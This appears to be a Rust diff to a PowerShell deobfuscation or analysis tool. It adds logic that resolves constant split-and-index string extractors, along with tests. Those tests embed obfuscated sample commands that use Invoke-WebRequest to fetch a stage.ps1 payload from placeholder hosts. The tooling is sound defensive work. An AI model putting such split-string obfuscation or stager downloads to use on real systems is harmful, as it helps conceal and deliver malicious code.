@@ -1103,6 +1103,14 @@ static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Split\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)\s*\[\s*(\d{1,6})\s*\]"#,
+    )
+    .expect("ps literal const split index extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?\(?\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?-(?:[ic])?split\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3767,42 +3775,70 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
 
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
-        let Some(caps) = PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE
+        if let Some(caps) = PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE
             .captures(&body)
             .or_else(|| PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE.captures(&body))
-        else {
+        {
+            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+                continue;
+            };
+            let Some(sep_var) = caps.get(2).map(|m| m.as_str()) else {
+                continue;
+            };
+            let Some(index_var) = caps.get(3).map(|m| m.as_str()) else {
+                continue;
+            };
+
+            let param_index = parse_ps_function_param_indices(&params);
+            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+                continue;
+            };
+            let Some(sep_idx) = param_index.get(&sep_var.to_ascii_lowercase()).copied() else {
+                continue;
+            };
+            let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
+                continue;
+            };
+
+            let binding = PsSplitExtractorParamBinding {
+                value_idx,
+                value_name: value_var,
+                sep_idx,
+                sep_name: sep_var,
+                index_idx,
+                index_name: index_var,
+            };
+            out = inline_ps_literal_split_index_calls(&out, &name, binding);
+            continue;
+        }
+
+        let Some(caps) = PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE.captures(&body) else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
             continue;
         };
-        let Some(sep_var) = caps.get(2).map(|m| m.as_str()) else {
+        let Some(sep) = caps
+            .get(2)
+            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
+        else {
             continue;
         };
-        let Some(index_var) = caps.get(3).map(|m| m.as_str()) else {
+        let Some(index) = caps.get(3).and_then(|m| m.as_str().parse::<usize>().ok()) else {
             continue;
         };
+        if sep.is_empty() || sep.len() > 512 || index > 4096 {
+            continue;
+        }
 
         let param_index = parse_ps_function_param_indices(&params);
         let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
             continue;
         };
-        let Some(sep_idx) = param_index.get(&sep_var.to_ascii_lowercase()).copied() else {
-            continue;
-        };
-        let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
-            continue;
-        };
 
-        let binding = PsSplitExtractorParamBinding {
-            value_idx,
-            value_name: value_var,
-            sep_idx,
-            sep_name: sep_var,
-            index_idx,
-            index_name: index_var,
-        };
-        out = inline_ps_literal_split_index_calls(&out, &name, binding);
+        out = inline_ps_literal_const_split_index_calls(
+            &out, &name, value_idx, value_var, &sep, index,
+        );
     }
     out
 }
@@ -4945,6 +4981,124 @@ fn ps_literal_replace_replacement(value: &str, needle: &str, repl: &str) -> Opti
         return None;
     }
     Some(format!("'{}'", replaced.replace('\'', "''")))
+}
+
+fn inline_ps_literal_const_split_index_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    value_name: &str,
+    sep: &str,
+    index: usize,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle_name in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle_name) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle_name.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) =
+                    inline_ps_named_literal_const_split_index_call(
+                        text,
+                        pos,
+                        parenthesized,
+                        value_name,
+                        sep,
+                        index,
+                    )
+                {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            if value.len() > 8192 {
+                search_from = value_end;
+                continue;
+            }
+            let mut call_end = value_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = value_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            if value_idx != 0 {
+                search_from = call_end;
+                continue;
+            }
+            let Some(replacement) = ps_literal_split_index_replacement(&value, sep, index) else {
+                search_from = call_end;
+                continue;
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_named_literal_const_split_index_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    sep: &str,
+    index: usize,
+) -> Option<(usize, String)> {
+    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_str();
+    Some((
+        call_end,
+        ps_literal_split_index_replacement(value, sep, index)?,
+    ))
+}
+
+fn ps_literal_split_index_replacement(value: &str, sep: &str, index: usize) -> Option<String> {
+    if value.len() > 8192 || sep.is_empty() {
+        return None;
+    }
+    let part = value.split(sep).nth(index)?;
+    if part.len() > 8192 {
+        return None;
+    }
+    Some(format!("'{}'", part.replace('\'', "''")))
 }
 
 fn inline_ps_literal_trim_calls(
@@ -8865,6 +9019,40 @@ Piece 'noise|Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1'"),
             "split-index extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_split_index_extractor_call_is_rewritten() {
+        let text = r#"function Piece($value) {
+  return $value.Split('|')[1]
+}
+Piece 'noise|Invoke-WebRequest -Uri https://ps-const-split-extractor.example/stage.ps1|tail'"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-const-split-extractor.example/stage.ps1'"
+            ),
+            "constant split-index extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_split_index_extractor_named_arg_call_is_rewritten() {
+        let text = r#"function Piece($value) {
+  return $value.Split('|')[1]
+}
+Piece -value 'noise|Invoke-WebRequest -Uri https://ps-const-split-named-arg.example/stage.ps1|tail'"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-const-split-named-arg.example/stage.ps1'"
+            ),
+            "constant split-index named-arg extractor call was not rewritten:\n{out}"
         );
     }
 
